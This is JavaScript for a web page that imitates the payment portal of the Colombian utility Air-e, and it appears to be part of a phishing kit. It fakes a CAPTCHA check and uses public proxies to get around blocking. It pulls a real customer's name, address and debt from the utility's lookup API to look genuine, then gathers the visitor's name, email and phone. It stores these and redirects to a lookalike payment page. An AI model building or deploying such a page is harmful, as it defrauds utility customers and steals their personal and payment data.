// --- 1. LÓGICA DE MENÚ (SIDEBAR) ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (window.innerWidth <= 768) sidebar.classList.toggle('mobile-open');
    else sidebar.classList.toggle('hidden');
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. LÓGICA DE RECAPTCHA ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

if(checkboxContainer){
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        fakeCheckbox.style.display = 'none';
        spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none';
            checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. LÓGICA PRINCIPAL (CONEXIÓN Y RENDERIZADO) ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if(btnPagar) {
    btnPagar.addEventListener('click', async () => {
        const nic = inputNic.value.trim();
        if(!nic) { alert("Por favor, ingrese el NIC."); return; }
        if(!isChecked) { alert("Por favor confirme que no es un robot."); return; }

        originalTitleStrip.style.display = 'none';
        whitePanel.innerHTML = `
            <div class="full-loader-container">
                <div class="big-loader"></div>
                <p>Consultando deuda en Air-e...</p>
            </div>`;

        const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
        
        // PROXIES: Probamos varios para evitar el error 403 en Render
        const proxyList = [
            `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}&_=${Date.now()}`,
            `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`,
            `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`
        ];

        let finalData = null;

        for (let url of proxyList) {
            try {
                const response = await fetch(url);
                if (!response.ok) continue;
                const result = await response.json();
                
                // Normalización de datos (AllOrigins usa .contents, otros no)
                let raw = result.contents ? result.contents : result;
                let parsed = (typeof raw === 'string') ? JSON.parse(raw) : raw;

                if (parsed && (parsed.ACCOUNTS || parsed.NAME)) {
                    finalData = parsed;
                    break; 
                }
            } catch (err) { console.warn("Proxy fallido, intentando siguiente..."); }
        }

        if (!finalData) {
            alert("No pudimos conectar con Air-e. Por favor intenta de nuevo en un momento.");
            location.reload();
            return;
        }

        const info = finalData.ACCOUNTS || finalData;
        const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
        const nombreUsuario = finalData.NAME || info.NAME || "USUARIO AIR-E";
        
        let valorMesNum = 0;
        if (info.INVOICES && info.INVOICES.length > 0) {
            valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
        }

        // --- PANTALLA DE RESULTADOS (FORMULARIO COMPLETO) ---
        whitePanel.innerHTML = `
        <div class="invoice-view">
            <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
            <div style="text-align:center; padding:10px; background:#f0f4f8; margin-bottom:15px; border-radius:5px; border:1px solid #d1d9e6;">
                <strong style="display:block; color:#004a99; text-transform:uppercase;">${nombreUsuario}</strong>
                <small>${info.COLLECTION_ADDRESS || 'Dirección no disponible'}</small>
            </div>
            
            <div class="invoice-form-grid">
                <div class="required-note">* Indica campo requerido</div>
                <div class="invoice-input-group">
                    <label class="invoice-label">No. identificación / NIC <span>*</span></label>
                    <input type="text" class="invoice-field" id="numId" value="${nic}" readonly>
                </div>
                <div class="invoice-input-group">
                    <label class="invoice-label">Nombres <span>*</span></label>
                    <input type="text" class="invoice-field" id="nombres" placeholder="Ej: Juan">
                </div>
                <div class="invoice-input-group">
                    <label class="invoice-label">Apellidos <span>*</span></label>
                    <input type="text" class="invoice-field" id="apellidos" placeholder="Ej: Perez">
                </div>
                <div class="invoice-input-group">
                    <label class="invoice-label">Correo <span>*</span></label>
                    <input type="email" class="invoice-field" id="correo" placeholder="correo@ejemplo.com">
                </div>
                <div class="invoice-input-group">
                    <label class="invoice-label">Celular <span>*</span></label>
                    <input type="text" class="invoice-field" id="celular" placeholder="3001234567">
                </div>
                <input type="hidden" id="direccion" value="${info.COLLECTION_ADDRESS || ''}">
            </div>

            <div class="payment-cards-grid">
                <div class="payment-card">
                    <div class="pay-card-title">Valor del mes</div>
                    <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                    <button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button>
                </div>
                <div class="payment-card">
                    <div class="pay-card-title">Deuda Total</div>
                    <div class="pay-card-amount" style="color:#d32f2f;">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                    <button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button>
                </div>
            </div>

            <div class="invoice-footer">
                <div class="terms-check">
                    <input type="checkbox" id="checkTerm" checked>
                    <span>Acepto políticas de tratamiento de datos personales.</span>
                </div>
                <button class="btn-cancel" onclick="location.reload()">VOLVER</button>
            </div>
        </div>`;
    });
}

// --- 4. FUNCIÓN DE GUARDADO (NO OMITE NADA) ---
window.guardarYRedirigir = function(monto, tipo) {
    // Capturamos todos los campos
    const nom = document.getElementById('nombres').value.trim();
    const ape = document.getElementById('apellidos').value.trim();
    const mail = document.getElementById('correo').value.trim();
    const cel = document.getElementById('celular').value.trim();
    const nic = document.getElementById('numId').value;
    const dir = document.getElementById('direccion').value;
    const term = document.getElementById('checkTerm');

    // Validación estricta
    if(!nom || !ape || !mail || !cel) {
        alert("Por favor, complete todos los campos requeridos (Nombres, Apellidos, Correo y Celular).");
        return;
    }
    if(!term || !term.checked) {
        alert("Debe aceptar los términos y condiciones.");
        return;
    }

    // Creamos el objeto EXACTO que espera tu siguiente página
    const datosFactura = {
        nombreCompleto: nom + " " + ape,
        numId: nic,
        correo: mail,
        celular: cel,
        direccion: dir,
        montoPagar: parseInt(monto),
        tipoPago: tipo, // 'mensual' o 'total'
        referencia: "AIR" + Math.floor(Math.random() * 900000 + 100000),
        fecha: new Date().toLocaleDateString()
    };
    
    // Guardamos en LocalStorage
    localStorage.setItem('datosFactura', JSON.stringify(datosFactura));
    
    // Redirección final
    window.location.href = 'portalpagos.portalfacture.com.html';
};
